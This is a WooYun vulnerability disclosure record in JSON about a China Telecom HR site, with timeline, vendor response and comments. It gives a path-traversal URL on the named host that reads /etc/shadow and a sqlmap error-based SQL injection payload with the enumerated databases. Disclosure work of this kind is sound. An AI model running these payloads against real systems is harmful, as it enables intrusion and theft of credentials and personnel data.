{"id": 3342, "wybug_id": "wooyun-2014-060244", "wybug_title": "中国电信某站SQL注入+文件包含漏洞(root权限可读shadow)", "wybug_corp": "中国电信", "wybug_author": "Mr .LZH", "wybug_date": "2014-05-10 22:42", "wybug_open_date": "2014-06-24 22:43", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入", "文件包含"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-24：\t细节向公众公开  简要描述： 中国电信某站注入+文件包含危害2个后台大量人员信息 详细说明：  后台一：http://rs.hntelecom.net.cn/HRSystem/initIndex.do后台二：http://rs.hntelecom.net.cn/loginadmin.do?m=login漏洞类型一：文件包含：rs.hntelecom.net.cn/filedown.do?m=filedown&path=/../..//../..//../..//../..//../..//etc/shadow%00\n\n看到没有，root权限的哦漏洞类型二：地址：rs.hntelecom.net.cn/search.do?m=searchpost数据：sss=test&Submit=%cb%d1%20%cb%f7&ttt=test地址：rs.hntelecom.net.cn/searchD.do?m=searchDpost数据：sss=test&Submit=%cb%d1%20%cb%f7&ttt=test话说2个地址都是一样功能，搞出2个有意思吗\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: ttt    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: sss=1&Submit=�� ��&ttt=1' AND (SELECT 7373 FROM(SELECT COUNT(*),CONCAT(CHAR(58,114,108,100,58),(SELECT (CASE WHEN (7373=7373) THEN 1 ELSE 0 END)),CHAR(58,111,112,99,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND 'JyFl'='JyFl---available databases [4]:[*] information_schema[*] manpower[*] test[*] yiqilaifinddifferences\n   漏洞证明：  \n\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: ttt    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: sss=1&Submit=�� ��&ttt=1' AND (SELECT 7373 FROM(SELECT COUNT(*),CONCAT(CHAR(58,114,108,100,58),(SELECT (CASE WHEN (7373=7373) THEN 1 ELSE 0 END)),CHAR(58,111,112,99,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND 'JyFl'='JyFl---available databases [4]:[*] information_schema[*] manpower[*] test[*] yiqilaifinddifferences\n   修复方案：  不继续深入，存在进一步渗透风险。漏洞叠加，rank给高点咯。。。   版权声明：转载请注明来源 Mr .LZH@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2014-05-13 17:45 厂商回复： CNVD确认并复现所述情况，转由CNCERT向中国电信集团公司通报处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-11 13:20 |    \t\t浅兮 \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:30        )\t\t \n  无语，移动，联通，电信这些厂商总是漏洞最多，漏洞最厉害的！佩服~~~    \n     2014-05-11 13:50 |    \t\tMr .LZH \t\t\t( 普通白帽子  |\t\t\t        Rank:583 漏洞数:75        | 非妹子勿扰···)\t\t \n  @浅兮 呵呵，他们技术太好了嘛，我等屌丝只能玩玩他们    \n     2014-05-11 13:54 |    \t\t浅兮 \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:30        )\t\t \n  @Mr .LZH 额，如果得到许多的手机充值卡，那就爽了！    \n     2014-05-11 13:55 |    \t\tMr .LZH \t\t\t( 普通白帽子  |\t\t\t        Rank:583 漏洞数:75        | 非妹子勿扰···)\t\t \n  @浅兮 这不是白帽子该干的事，得到了也会通知他们收回去    \n     2014-05-11 14:08 |    \t\t浅兮 \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:30        )\t\t \n  @Mr .LZH 额，无语！    \n     2014-06-25 09:18 |    \t\tdbgger \t\t\t( 普通白帽子  |\t\t\t        Rank:120 漏洞数:9        | Nothing else...)\t\t \n  好像是下载,不是lfi    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}